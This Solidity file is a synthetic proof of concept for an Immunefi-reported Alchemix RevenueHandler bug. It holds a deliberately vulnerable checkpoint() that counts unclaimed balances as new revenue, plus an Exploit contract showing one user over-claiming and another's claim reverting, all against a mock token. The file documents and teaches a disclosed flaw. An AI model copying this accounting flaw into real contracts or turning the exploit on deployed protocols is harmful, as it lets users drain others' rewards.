// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — RevenueHandler.checkpoint counts unclaimed rewards as new
    rewards, causing reduced rewards for late claimers (Immunefi, yttriumzz,
    finding #38176)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground. The vulnerable
    checkpoint() body (poolAdapter == 0 / non-alchemic-token path) is inlined
    VERBATIM. Two equal-weight users (50/50 split) share a revenue stream:
    user1 claims promptly after each checkpoint, user2 does not. Because
    checkpoint() re-counts USER2's still-unclaimed balance as if it were
    fresh revenue, user1 ends up over-claiming relative to their fair share,
    and the pool runs out of real tokens before user2 can claim their
    (nominally correct, per the buggy books) entitlement -- exactly matching
    this finding's own PoC output ("claimable of user2 is X, but revert").

    Root cause (same defect as companion findings #38111/#38174, reported
    independently by other researchers): for a revenue token with
    poolAdapter == address(0), checkpoint() does
        amountReceived = thisBalance;              // thisBalance = balanceOf(this)
        epochRevenues[currentEpoch][token] += amountReceived;
    `thisBalance` is the contract's WHOLE current balance, which still
    contains any revenue recorded (but not yet claimed) by users who haven't
    claimed. Every checkpoint() therefore re-adds that unclaimed balance as
    if it were newly-arrived revenue.
//////////////////////////////////////////////////////////////////////////*/

contract MockBAL {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "insufficient balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced RevenueHandler modeling a poolAdapter == address(0)
///         revenue token (e.g. BAL) split 50/50 between two equal-weight
///         veALCX holders. `advanceEpoch()` is test scaffolding standing in
///         for the real `block.timestamp >= currentEpoch + WEEK` guard, so
///         the PoC needs no time-warp cheatcodes. This affects ONLY the
///         once-per-epoch gating; the vulnerable accounting line is untouched.
contract RevenueHandler {
    MockBAL public immutable BAL_TOKEN;
    uint256 public currentEpoch;
    bool private epochReady = true;

    mapping(uint256 => uint256) public epochRevenues; // epoch -> total recorded revenue
    mapping(address => uint256) public claimed; // user -> total ever claimed

    constructor(MockBAL bal) {
        BAL_TOKEN = bal;
    }

    /// @dev Test scaffolding only -- marks that a new epoch has elapsed.
    function advanceEpoch() external {
        epochReady = true;
    }

    /**
     * @notice checkpoint -- must be called once per epoch to record revenue
     *         (reduced from RevenueHandler.checkpoint's poolAdapter == 0 path)
     */
    function checkpoint() public {
        // only run checkpoint() once per epoch
        if (epochReady) {
            epochReady = false;
            currentEpoch += 1;

            uint256 thisBalance = BAL_TOKEN.balanceOf(address(this));

            // poolAdapter == address(0): the revenue token is not an alchemic-token
            uint256 amountReceived = thisBalance;

            // @> VULN: thisBalance is the WHOLE current balance -- it still contains
            //          any revenue recorded (but unclaimed) by users who haven't
            //          claimed yet, so it gets recorded AGAIN as if freshly-arrived.
            epochRevenues[currentEpoch] += amountReceived;
            // FIX: amountReceived = thisBalance - lastCheckpointedBalance; lastCheckpointedBalance = thisBalance;
        }
    }

    /// @notice Simplified claimable: two equal-weight (50/50) holders share
    ///         every recorded epoch's revenue evenly.
    function claimable(address user) public view returns (uint256 total) {
        uint256 fairShare;
        for (uint256 e = 1; e <= currentEpoch; e++) {
            fairShare += epochRevenues[e] / 2;
        }
        return fairShare - claimed[user];
    }

    /// @notice Pays out a user's full outstanding claimable amount. Reverts
    ///         if the contract's real token balance can't cover it -- exactly
    ///         mirroring the finding's own PoC ("expectRevert: Not enough
    ///         revenue to claim").
    function claim(address user) external {
        uint256 amt = claimable(user);
        require(amt > 0, "nothing to claim");
        require(BAL_TOKEN.balanceOf(address(this)) >= amt, "Not enough revenue to claim");
        claimed[user] += amt;
        BAL_TOKEN.transfer(user, amt);
    }
}

/// @notice user1 claims promptly after every checkpoint; user2 does not.
///         Demonstrates that checkpoint()'s double-count causes user1 to
///         over-claim relative to their fair share, leaving the contract
///         unable to honor user2's equal, on-paper-correct claim.
contract Exploit {
    MockBAL public bal;
    RevenueHandler public revenueHandler;
    address public constant USER1 = address(0xACC1);
    address public constant USER2 = address(0xACC2);

    uint256 public constant EPOCH_REVENUE = 100 ether; // arrives once per epoch

    constructor() {
        bal = new MockBAL();
        revenueHandler = new RevenueHandler(bal);
    }

    function run() external {
        // --- Epoch 1: 100 BAL arrives, checkpointed correctly (first-ever checkpoint). ---
        bal.mint(address(revenueHandler), EPOCH_REVENUE);
        revenueHandler.checkpoint();
        require(revenueHandler.epochRevenues(1) == EPOCH_REVENUE, "sanity: epoch 1 recorded correctly");

        // user1 claims promptly: fair share of epoch 1 = 50 BAL.
        revenueHandler.claim(USER1);
        uint256 user1AfterEpoch1 = bal.balanceOf(USER1);
        require(user1AfterEpoch1 == 50 ether, "sanity: user1 claims 50 BAL after epoch 1");
        // user2 does NOT claim -- their 50 BAL share stays in the contract, unclaimed.

        // --- Epoch 2: ANOTHER 100 BAL arrives. Contract now holds 50 (user2's
        //     unclaimed epoch-1 share) + 100 (new) = 150 BAL. ---
        bal.mint(address(revenueHandler), EPOCH_REVENUE);
        revenueHandler.advanceEpoch();
        revenueHandler.checkpoint();

        // VULN in action: epochRevenues[2] is recorded as the WHOLE balance
        // (150), not just the 100 that actually arrived this epoch.
        require(revenueHandler.epochRevenues(2) == 150 ether, "harm not demonstrated: epoch 2 should double-count user2's unclaimed share");

        // Total ever recorded: 100 + 150 = 250. Fair share per user: 125 each.
        require(revenueHandler.claimable(USER1) == 75 ether, "sanity: user1 additional claimable is 125 - 50 already claimed");
        require(revenueHandler.claimable(USER2) == 125 ether, "sanity: user2's full claimable (never claimed before) is 125");

        // user1 claims their remaining 75 BAL. Contract balance: 150 - 75 = 75.
        revenueHandler.claim(USER1);
        uint256 user1Total = bal.balanceOf(USER1);
        require(user1Total == 125 ether, "harm not demonstrated: user1 should have received 125 BAL total (25 BAL more than the fair 100 BAL for 2 epochs)");

        // HARM: user2 tries to claim their 125 BAL (nominally correct per the
        // buggy books) but only 75 BAL of real tokens remain in the contract.
        uint256 realBalance = bal.balanceOf(address(revenueHandler));
        require(realBalance == 75 ether, "sanity: only 75 BAL of real tokens remain");
        require(realBalance < revenueHandler.claimable(USER2), "harm not demonstrated: contract should be insolvent for user2's fair claim");

        (bool ok, ) = address(revenueHandler).call(abi.encodeWithSelector(RevenueHandler.claim.selector, USER2));
        require(!ok, "harm not demonstrated: user2's claim should revert, exactly as in the finding's own PoC");

        // HARM confirmed: only 200 BAL was EVER transferred in (100/epoch x 2
        // epochs), split 50/50 the fair total per user is 100 BAL each. But
        // user1 walked away with 125 BAL (25 BAL over their fair share) while
        // user2 got 0 and cannot claim -- the 25 BAL excess came directly out
        // of user2's rightful share.
        require(user1Total > 100 ether, "harm not demonstrated: user1's total exceeds their fair 100 BAL share");
    }
}
